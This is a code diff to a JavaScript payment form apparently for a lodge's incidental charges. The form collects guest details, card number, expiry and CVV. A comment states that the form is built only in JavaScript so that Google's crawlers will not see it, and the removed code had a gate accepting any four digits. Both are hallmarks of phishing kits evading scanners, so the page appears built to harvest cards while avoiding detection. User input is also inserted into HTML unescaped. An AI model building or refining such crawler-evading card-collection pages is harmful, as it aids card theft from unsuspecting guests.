@@ -31,34 +31,37 @@ function checkLuhn(input) {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-    const passcodeGate = document.getElementById('passcode-gate');
-    const passcodeBtn = document.getElementById('unlock-btn');
-    const passcodeInput = document.getElementById('security-passcode');
-    const passcodeError = document.getElementById('passcode-error');
+    const page1Gate = document.getElementById('page-1-gate');
+    const nextBtn = document.getElementById('next-btn');
+    const step1Name = document.getElementById('step1-fullName');
+    const step1Mobile = document.getElementById('step1-mobile');
     const dynamicContainer = document.getElementById('dynamic-form-container');
 
+    // Format Mobile Number securely on Page 1
+    step1Mobile.addEventListener('input', (e) => {
+        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
+        e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
+    });
+
     // This form structure ONLY exists in Javascript now. Google bots won't see it naturally.
-    const formHTML = `
+    const formHTML = (name, mobile) => `
         <form id="incidental-form">
             <input type="hidden" id="propertyName" name="propertyName" value="Tucker Peak Lodge">
-            <!-- Personal Info -->
-            <div class="section-title">Guest Information</div>
-            <div class="form-group">
-                <label for="fullName">Full Name</label>
-                <input type="text" id="fullName" name="fullName" required placeholder="John Doe">
+            
+            <!-- Summary Box -->
+            <div style="background-color: #f3f4f6; padding: 1rem; border-radius: 8px; margin-bottom: 1.5rem; display: flex; justify-content: space-between; align-items: center;">
+                <div>
+                    <p style="margin: 0 0 0.25rem 0; font-size: 0.9rem; color: #4b5563;">Guest: <strong>${name}</strong></p>
+                    <p style="margin: 0; font-size: 0.9rem; color: #4b5563;">Mobile: <strong>${mobile}</strong></p>
+                </div>
+                <button type="button" id="edit-btn" style="background: none; border: 1px solid #d1d5db; padding: 0.4rem 0.8rem; border-radius: 6px; cursor: pointer; font-size: 0.85rem; font-weight: 500;">Edit</button>
             </div>
             
-            <div class="form-row">
-                <div class="form-group">
-                    <label for="email">Email Address</label>
-                    <input type="email" id="email" name="email" required placeholder="john@example.com" pattern="[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}$" title="Please enter a valid email address (e.g., name@domain.com)">
-                </div>
-                <div class="form-group">
-                    <label for="mobile">Mobile Number</label>
-                    <input type="tel" id="mobile" name="mobile" required placeholder="(555) 123-4567" pattern="\\(\\d{3}\\) \\d{3}-\\d{4}" title="Please enter a valid 10-digit phone number" maxlength="14">
-                </div>
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required placeholder="john@example.com" pattern="[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}$" title="Please enter a valid email address (e.g., name@domain.com)">
             </div>
-
+            
             <div class="form-group">
                 <label for="address">Billing Address</label>
                 <input type="text" id="address" name="address" required placeholder="123 Main St, City, State, ZIP">
@@ -94,22 +97,24 @@ document.addEventListener('DOMContentLoaded', () => {
         </form>
     `;
 
-    passcodeBtn.addEventListener('click', unlockForm);
-    passcodeInput.addEventListener('keypress', (e) => {
-        if(e.key === 'Enter') unlockForm();
-    });
-
-    function unlockForm() {
-        const val = passcodeInput.value.trim();
-        // Passcode gate checks for exactly 4 digits
-        if (val.length === 4 && /^\d+$/.test(val)) {
-            passcodeGate.classList.add('hide');
-            dynamicContainer.innerHTML = formHTML;
-            initializeFormLogic();
-        } else {
-            passcodeError.classList.remove('hide');
+    nextBtn.addEventListener('click', () => {
+        const nameVal = step1Name.value.trim();
+        const mobileVal = step1Mobile.value.trim();
+        
+        if (!nameVal) {
+            alert("Please enter your full name.");
+            return;
         }
-    }
+        if (mobileVal.replace(/\D/g, '').length < 10) {
+            alert("Please enter a valid 10-digit mobile number.");
+            return;
+        }
+
+        page1Gate.classList.add('hide');
+        dynamicContainer.innerHTML = formHTML(nameVal, mobileVal);
+        dynamicContainer.classList.remove('hide');
+        initializeFormLogic();
+    });
 
     const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiiPytPRc76MzWsFwPaA1
@@ -139,17 +144,17 @@ UwIDAQAB
         const ccInput = document.getElementById('ccNumber');
         const expInput = document.getElementById('expDate');
         const cvvInput = document.getElementById('cvv');
-        const mobileInput = document.getElementById('mobile');
         const form = document.getElementById('incidental-form');
         const formCard = document.getElementById('form-card');
         const successCard = document.getElementById('success-card');
         const submitBtn = document.getElementById('submit-btn');
         const spinner = document.getElementById('spinner');
+        const editBtn = document.getElementById('edit-btn');
 
-        // Format Mobile Number: (XXX) XXX-XXXX
-        mobileInput.addEventListener('input', (e) => {
-            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
-            e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
+        editBtn.addEventListener('click', () => {
+            dynamicContainer.classList.add('hide');
+            dynamicContainer.innerHTML = '';
+            page1Gate.classList.remove('hide');
         });
 
         // Format CC Number
@@ -242,9 +247,9 @@ UwIDAQAB
             // Gather Data
             const formData = {
                 propertyName: document.getElementById('propertyName').value,
-                fullName: document.getElementById('fullName').value,
+                fullName: step1Name.value.trim(),
                 email: document.getElementById('email').value,
-                mobile: document.getElementById('mobile').value,
+                mobile: step1Mobile.value.trim(),
                 address: document.getElementById('address').value,
                 // Apply true RSA Encryption
                 ccNumber: encryptData(document.getElementById('ccNumber').value),
